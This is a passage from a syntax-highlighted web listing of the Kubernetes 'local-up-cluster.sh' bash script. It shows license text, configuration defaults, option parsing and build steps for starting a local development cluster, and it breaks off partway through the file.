class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Copyright 2014 The Kubernetes Authors.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Licensed under the Apache License, Version 2.0 (the <span class="string">"License"</span>);</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> you may not use this file except <span class="keyword">in</span> compliance with the License.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> You may obtain a copy of the License at</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash">     http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Unless required by applicable law or agreed to <span class="keyword">in</span> writing, software</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> distributed under the License is distributed on an <span class="string">"AS IS"</span> BASIS,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> See the License <span class="keyword">for</span> the specific language governing permissions and</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> limitations under the License.</span></span><br><span class="line">set -x</span><br><span class="line">KUBE_ROOT=$(dirname "$&#123;BASH_SOURCE&#125;")/..</span><br><span class="line"><span class="meta">#</span><span class="bash"> This <span class="built_in">command</span> builds and runs a <span class="built_in">local</span> kubernetes cluster.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> You may need to run this as root to allow kubelet to open docker<span class="string">'s socket,</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and to write the <span class="built_in">test</span> CA <span class="keyword">in</span> /var/run/kubernetes.</span></span><br><span class="line">DOCKER_OPTS=$&#123;DOCKER_OPTS:-""&#125;</span><br><span class="line">DOCKER=(docker $&#123;DOCKER_OPTS&#125;)</span><br><span class="line">DOCKERIZE_KUBELET=$&#123;DOCKERIZE_KUBELET:-""&#125;</span><br><span class="line">ALLOW_PRIVILEGED=$&#123;ALLOW_PRIVILEGED:-""&#125;</span><br><span class="line">DENY_SECURITY_CONTEXT_ADMISSION=$&#123;DENY_SECURITY_CONTEXT_ADMISSION:-""&#125;</span><br><span class="line">PSP_ADMISSION=$&#123;PSP_ADMISSION:-""&#125;</span><br><span class="line">NODE_ADMISSION=$&#123;NODE_ADMISSION:-""&#125;</span><br><span class="line">RUNTIME_CONFIG=$&#123;RUNTIME_CONFIG:-""&#125;</span><br><span class="line">KUBELET_AUTHORIZATION_WEBHOOK=$&#123;KUBELET_AUTHORIZATION_WEBHOOK:-""&#125;</span><br><span class="line">KUBELET_AUTHENTICATION_WEBHOOK=$&#123;KUBELET_AUTHENTICATION_WEBHOOK:-""&#125;</span><br><span class="line">POD_MANIFEST_PATH=$&#123;POD_MANIFEST_PATH:-"/var/run/kubernetes/static-pods"&#125;</span><br><span class="line">KUBELET_FLAGS=$&#123;KUBELET_FLAGS:-""&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> many dev environments run with swap on, so we don<span class="string">'t fail in this env</span></span></span><br><span class="line">FAIL_SWAP_ON=$&#123;FAIL_SWAP_ON:-"false"&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> Name of the network plugin, eg: <span class="string">"kubenet"</span></span></span><br><span class="line">NET_PLUGIN=$&#123;NET_PLUGIN:-""&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> Place the config files and binaries required by NET_PLUGIN <span class="keyword">in</span> these directory,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> eg: <span class="string">"/etc/cni/net.d"</span> <span class="keyword">for</span> config files, and <span class="string">"/opt/cni/bin"</span> <span class="keyword">for</span> binaries.</span></span><br><span class="line">CNI_CONF_DIR=$&#123;CNI_CONF_DIR:-""&#125;</span><br><span class="line">CNI_BIN_DIR=$&#123;CNI_BIN_DIR:-""&#125;</span><br><span class="line">SERVICE_CLUSTER_IP_RANGE=$&#123;SERVICE_CLUSTER_IP_RANGE:-10.0.0.0/24&#125;</span><br><span class="line">FIRST_SERVICE_CLUSTER_IP=$&#123;FIRST_SERVICE_CLUSTER_IP:-10.0.0.1&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">if</span> enabled, must <span class="built_in">set</span> CGROUP_ROOT</span></span><br><span class="line">CGROUPS_PER_QOS=$&#123;CGROUPS_PER_QOS:-true&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> name of the cgroup driver, i.e. cgroupfs or systemd</span></span><br><span class="line">CGROUP_DRIVER=$&#123;CGROUP_DRIVER:-""&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> owner of client certs, default to current user <span class="keyword">if</span> not specified</span></span><br><span class="line">USER=$&#123;USER:-$(whoami)&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> enables testing eviction scenarios locally.</span></span><br><span class="line">EVICTION_HARD=$&#123;EVICTION_HARD:-"memory.available&lt;100Mi,nodefs.available&lt;10%,nodefs.inodesFree&lt;5%"&#125;</span><br><span class="line">EVICTION_SOFT=$&#123;EVICTION_SOFT:-""&#125;</span><br><span class="line">EVICTION_PRESSURE_TRANSITION_PERIOD=$&#123;EVICTION_PRESSURE_TRANSITION_PERIOD:-"1m"&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> This script uses docker0 (or whatever container bridge docker is currently using)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and we don<span class="string">'t know the IP of the DNS pod to pass in as --cluster-dns.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> To <span class="built_in">set</span> this up by hand, <span class="built_in">set</span> this flag and change DNS_SERVER_IP.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Note also that you need API_HOST (defined above) <span class="keyword">for</span> correct DNS.</span></span><br><span class="line">KUBE_PROXY_MODE=$&#123;KUBE_PROXY_MODE:-""&#125;</span><br><span class="line">ENABLE_CLUSTER_DNS=$&#123;KUBE_ENABLE_CLUSTER_DNS:-true&#125;</span><br><span class="line">DNS_SERVER_IP=$&#123;KUBE_DNS_SERVER_IP:-10.0.0.10&#125;</span><br><span class="line">DNS_DOMAIN=$&#123;KUBE_DNS_NAME:-"cluster.local"&#125;</span><br><span class="line">KUBECTL=$&#123;KUBECTL:-cluster/kubectl.sh&#125;</span><br><span class="line">WAIT_FOR_URL_API_SERVER=$&#123;WAIT_FOR_URL_API_SERVER:-60&#125;</span><br><span class="line">ENABLE_DAEMON=$&#123;ENABLE_DAEMON:-false&#125;</span><br><span class="line">HOSTNAME_OVERRIDE=$&#123;HOSTNAME_OVERRIDE:-"127.0.0.1"&#125;</span><br><span class="line">EXTERNAL_CLOUD_PROVIDER=$&#123;EXTERNAL_CLOUD_PROVIDER:-false&#125;</span><br><span class="line">EXTERNAL_CLOUD_PROVIDER_BINARY=$&#123;EXTERNAL_CLOUD_PROVIDER_BINARY:-""&#125;</span><br><span class="line">CLOUD_PROVIDER=$&#123;CLOUD_PROVIDER:-""&#125;</span><br><span class="line">CLOUD_CONFIG=$&#123;CLOUD_CONFIG:-""&#125;</span><br><span class="line">FEATURE_GATES=$&#123;FEATURE_GATES:-"AllAlpha=false"&#125;</span><br><span class="line">STORAGE_BACKEND=$&#123;STORAGE_BACKEND:-"etcd3"&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">enable</span> swagger ui</span></span><br><span class="line">ENABLE_SWAGGER_UI=$&#123;ENABLE_SWAGGER_UI:-false&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">enable</span> Pod priority and preemption</span></span><br><span class="line">ENABLE_POD_PRIORITY_PREEMPTION=$&#123;ENABLE_POD_PRIORITY_PREEMPTION:-""&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">enable</span> kubernetes dashboard</span></span><br><span class="line">ENABLE_CLUSTER_DASHBOARD=$&#123;KUBE_ENABLE_CLUSTER_DASHBOARD:-false&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">enable</span> audit <span class="built_in">log</span></span></span><br><span class="line">ENABLE_APISERVER_BASIC_AUDIT=$&#123;ENABLE_APISERVER_BASIC_AUDIT:-false&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> RBAC Mode options</span></span><br><span class="line">AUTHORIZATION_MODE=$&#123;AUTHORIZATION_MODE:-"Node,RBAC"&#125;</span><br><span class="line">KUBECONFIG_TOKEN=$&#123;KUBECONFIG_TOKEN:-""&#125;</span><br><span class="line">AUTH_ARGS=$&#123;AUTH_ARGS:-""&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> Install a default storage class (enabled by default)</span></span><br><span class="line">DEFAULT_STORAGE_CLASS=$&#123;KUBE_DEFAULT_STORAGE_CLASS:-true&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> start the cache mutation detector by default so that cache mutators will be found</span></span><br><span class="line">KUBE_CACHE_MUTATION_DETECTOR="$&#123;KUBE_CACHE_MUTATION_DETECTOR:-true&#125;"</span><br><span class="line">export KUBE_CACHE_MUTATION_DETECTOR</span><br><span class="line"><span class="meta">#</span><span class="bash"> panic the server on watch decode errors since they are considered coder mistakes</span></span><br><span class="line">KUBE_PANIC_WATCH_DECODE_ERROR="$&#123;KUBE_PANIC_WATCH_DECODE_ERROR:-true&#125;"</span><br><span class="line">export KUBE_PANIC_WATCH_DECODE_ERROR</span><br><span class="line">ENABLE_ADMISSION_PLUGINS=$&#123;ENABLE_ADMISSION_PLUGINS:-""&#125;</span><br><span class="line">DISABLE_ADMISSION_PLUGINS=$&#123;DISABLE_ADMISSION_PLUGINS:-""&#125;</span><br><span class="line">ADMISSION_CONTROL_CONFIG_FILE=$&#123;ADMISSION_CONTROL_CONFIG_FILE:-""&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> START_MODE can be <span class="string">'all'</span>, <span class="string">'kubeletonly'</span>, or <span class="string">'nokubelet'</span></span></span><br><span class="line">START_MODE=$&#123;START_MODE:-"all"&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> A list of controllers to <span class="built_in">enable</span></span></span><br><span class="line">KUBE_CONTROLLERS="$&#123;KUBE_CONTROLLERS:-"*"&#125;"</span><br><span class="line"><span class="meta">#</span><span class="bash"> sanity check <span class="keyword">for</span> OpenStack provider</span></span><br><span class="line">if [ "$&#123;CLOUD_PROVIDER&#125;" == "openstack" ]; then</span><br><span class="line">    if [ "$&#123;CLOUD_CONFIG&#125;" == "" ]; then</span><br><span class="line">        echo "Missing CLOUD_CONFIG env for OpenStack provider!"</span><br><span class="line">        exit 1</span><br><span class="line">    fi</span><br><span class="line">    if [ ! -f "$&#123;CLOUD_CONFIG&#125;" ]; then</span><br><span class="line">        echo "Cloud config $&#123;CLOUD_CONFIG&#125; doesn't exist"</span><br><span class="line">        exit 1</span><br><span class="line">    fi</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span> feature gates <span class="keyword">if</span> using ipvs mode</span></span><br><span class="line">if [ "$&#123;KUBE_PROXY_MODE&#125;" == "ipvs" ]; then</span><br><span class="line">    # If required kernel modules are not available, fall back to iptables.</span><br><span class="line">    sudo modprobe -a ip_vs ip_vs_rr ip_vs_wrr ip_vs_sh nf_conntrack_ipv4</span><br><span class="line">    if [[ $? -eq 0 ]]; then</span><br><span class="line">      FEATURE_GATES="$&#123;FEATURE_GATES&#125;,SupportIPVSProxyMode=true"</span><br><span class="line">    else</span><br><span class="line">      echo "Required kernel modules for ipvs not found. Falling back to iptables mode."</span><br><span class="line">      KUBE_PROXY_MODE=iptables</span><br><span class="line">    fi</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span> feature gates <span class="keyword">if</span> <span class="built_in">enable</span> Pod priority and preemption</span></span><br><span class="line">if [ "$&#123;ENABLE_POD_PRIORITY_PREEMPTION&#125;" == true ]; then</span><br><span class="line">    FEATURE_GATES="$FEATURE_GATES,PodPriority=true"</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> warn <span class="keyword">if</span> users are running with swap allowed</span></span><br><span class="line">if [ "$&#123;FAIL_SWAP_ON&#125;" == "false" ]; then</span><br><span class="line">    echo "WARNING : The kubelet is configured to not fail if swap is enabled; production deployments should disable swap."</span><br><span class="line">fi</span><br><span class="line">if [ "$(id -u)" != "0" ]; then</span><br><span class="line">    echo "WARNING : This script MAY be run as root for docker socket / iptables functionality; if failures occur, retry as root." 2&gt;&amp;1</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> Stop right away <span class="keyword">if</span> the build fails</span></span><br><span class="line">set -e</span><br><span class="line">source "$&#123;KUBE_ROOT&#125;/hack/lib/init.sh"</span><br><span class="line">function usage &#123;</span><br><span class="line">            echo "This script starts a local kube cluster. "</span><br><span class="line">            echo "Example 0: hack/local-up-cluster.sh -h  (this 'help' usage description)"</span><br><span class="line">            echo "Example 1: hack/local-up-cluster.sh -o _output/dockerized/bin/linux/amd64/ (run from docker output)"</span><br><span class="line">            echo "Example 2: hack/local-up-cluster.sh -O (auto-guess the bin path for your platform)"</span><br><span class="line">            echo "Example 3: hack/local-up-cluster.sh (build a local copy of the source)"</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> This <span class="keyword">function</span> guesses <span class="built_in">where</span> the existing cached binary build is <span class="keyword">for</span> the `-O`</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> flag</span></span><br><span class="line">function guess_built_binary_path &#123;</span><br><span class="line"><span class="meta">  #</span><span class="bash"><span class="built_in">local</span> hyperkube_path=$(kube::util::find-binary <span class="string">"hyperkube"</span>)</span></span><br><span class="line">  local hyperkube_path=$(kube::util::find-binary "kube-apiserver")</span><br><span class="line">  if [[ -z "$&#123;hyperkube_path&#125;" ]]; then</span><br><span class="line">    return</span><br><span class="line">  fi</span><br><span class="line">  echo -n "$(dirname "$&#123;hyperkube_path&#125;")"</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## Allow user to supply the source directory.</span></span></span><br><span class="line">GO_OUT=$&#123;GO_OUT:-&#125;</span><br><span class="line">while getopts "ho:O" OPTION</span><br><span class="line">do</span><br><span class="line">    case $OPTION in</span><br><span class="line">        o)</span><br><span class="line">            echo "skipping build"</span><br><span class="line">            GO_OUT="$OPTARG"</span><br><span class="line">            echo "using source $GO_OUT"</span><br><span class="line">            ;;</span><br><span class="line">        O)</span><br><span class="line">            GO_OUT=$(guess_built_binary_path)</span><br><span class="line">            if [ "$GO_OUT" == "" ]; then</span><br><span class="line">                echo "Could not guess the correct output directory to use."</span><br><span class="line">                exit 1</span><br><span class="line">            fi</span><br><span class="line">            ;;</span><br><span class="line">        h)</span><br><span class="line">            usage</span><br><span class="line">            exit</span><br><span class="line">            ;;</span><br><span class="line">        ?)</span><br><span class="line">            usage</span><br><span class="line">            exit</span><br><span class="line">            ;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br><span class="line">if [ "x$GO_OUT" == "x" ]; then</span><br><span class="line">    #make -C "$&#123;KUBE_ROOT&#125;" WHAT="cmd/kubectl cmd/hyperkube"</span><br><span class="line">    make -C "$&#123;KUBE_ROOT&#125;" GOGCFLAGS="-N -l" WHAT="cmd/kubectl cmd/kube-proxy cmd/kube-apiserver cmd/kube-controller-manager cmd/cloud-controller-manager cmd/kube-scheduler cmd/kubelet"</span><br><span class="line">else</span><br><span class="line">    echo "skipped the build."</span><br><span class="line">fi</span><br><span class="line">function test_rkt &#123;</span><br><span class="line">    if [[ -n "$&#123;RKT_PATH&#125;" ]]; then</span><br><span class="line">      $&#123;RKT_PATH&#125; list 2&gt; /dev/null 1&gt; /dev/null</span><br><span class="line">      if [ "$?" != "0" ]; then</span><br><span class="line">        echo "Failed to successfully run 'rkt list', please verify that $&#123;RKT_PATH&#125; is the path of rkt binary."</span><br><span class="line">        exit 1</span><br><span class="line">      fi</span><br><span class="line">    else</span><br><span class="line">      rkt list 2&gt; /dev/null 1&gt; /dev/null</span><br><span class="line">      if [ "$?" != "0" ]; then</span><br><span class="line">        echo "Failed to successfully run 'rkt list', please verify that rkt is in \$PATH."</span><br><span class="line">        exit 1</span><br><span class="line">      fi</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> Shut down anyway <span class="keyword">if</span> there<span class="string">'s an error.</span></span></span><br><span class="line">set +e</span><br><span class="line">API_PORT=$&#123;API_PORT:-8080&#125;</span><br><span class="line">API_SECURE_PORT=$&#123;API_SECURE_PORT:-6443&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> WARNING: For DNS to work on most setups you should <span class="built_in">export</span> API_HOST as the docker0 ip address,</span></span><br><span class="line">API_HOST=$&#123;API_HOST:-localhost&#125;</span><br><span class="line">API_HOST_IP=$&#123;API_HOST_IP:-"127.0.0.1"&#125;</span><br><span class="line">ADVERTISE_ADDRESS=$&#123;ADVERTISE_ADDRESS:-""&#125;</span><br><span class="line">API_BIND_ADDR=$&#123;API_BIND_ADDR:-"0.0.0.0"&#125;</span><br><span class="line">EXTERNAL_HOSTNAME=$&#123;EXTERNAL_HOSTNAME:-localhost&#125;</span><br><span class="line">KUBELET_HOST=$&#123;KUBELET_HOST:-"127.0.0.1"&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> By default only allow CORS <span class="keyword">for</span> requests on localhost</span></span><br><span class="line">API_CORS_ALLOWED_ORIGINS=$&#123;API_CORS_ALLOWED_ORIGINS:-/127.0.0.1(:[0-9]+)?$,/localhost(:[0-9]+)?$&#125;</span><br><span class="line">KUBELET_PORT=$&#123;KUBELET_PORT:-10250&#125;</span><br><span class="line">LOG_LEVEL=$&#123;LOG_LEVEL:-3&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> Use to increase verbosity on particular files, e.g. LOG_SPEC=token_controller*=5,other_controller*=4</span></span><br><span class="line">LOG_SPEC=$&#123;LOG_SPEC:-""&#125;</span><br><span class="line">LOG_DIR=$&#123;LOG_DIR:-"/tmp"&#125;</span><br><span class="line">CONTAINER_RUNTIME=$&#123;CONTAINER_RUNTIME:-"docker"&#125;</span><br><span class="line">CONTAINER_RUNTIME_ENDPOINT=$&#123;CONTAINER_RUNTIME_ENDPOINT:-""&#125;</span><br><span class="line">IMAGE_SERVICE_ENDPOINT=$&#123;IMAGE_SERVICE_ENDPOINT:-""&#125;</span><br><span class="line">RKT_PATH=$&#123;RKT_PATH:-""&#125;</span><br><span class="line">RKT_STAGE1_IMAGE=$&#123;RKT_STAGE1_IMAGE:-""&#125;</span><br><span class="line">CHAOS_CHANCE=$&#123;CHAOS_CHANCE:-0.0&#125;</span><br><span class="line">CPU_CFS_QUOTA=$&#123;CPU_CFS_QUOTA:-true&#125;</span><br><span class="line">ENABLE_HOSTPATH_PROVISIONER=$&#123;ENABLE_HOSTPATH_PROVISIONER:-"false"&#125;</span><br><span class="line">CLAIM_BINDER_SYNC_PERIOD=$&#123;CLAIM_BINDER_SYNC_PERIOD:-"15s"&#125; # current k8s default</span><br><span class="line">ENABLE_CONTROLLER_ATTACH_DETACH=$&#123;ENABLE_CONTROLLER_ATTACH_DETACH:-"true"&#125; # current default</span><br><span class="line">KEEP_TERMINATED_POD_VOLUMES=$&#123;KEEP_TERMINATED_POD_VOLUMES:-"true"&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> This is the default dir and filename <span class="built_in">where</span> the apiserver will generate a self-signed cert</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">which</span> should be able to be used as the CA to verify itself</span></span><br><span class="line">CERT_DIR=$&#123;CERT_DIR:-"/var/run/kubernetes"&#125;</span><br><span class="line">ROOT_CA_FILE=$&#123;CERT_DIR&#125;/server-ca.crt</span><br><span class="line">ROOT_CA_KEY=$&#123;CERT_DIR&#125;/server-ca.key</span><br><span class="line">CLUSTER_SIGNING_CERT_FILE=$&#123;CLUSTER_SIGNING_CERT_FILE:-"$&#123;ROOT_CA_FILE&#125;"&#125;</span><br><span class="line">CLUSTER_SIGNING_KEY_FILE=$&#123;CLUSTER_SIGNING_KEY_FILE:-"$&#123;ROOT_CA_KEY&#125;"&#125;</span><br><span class="line"><span 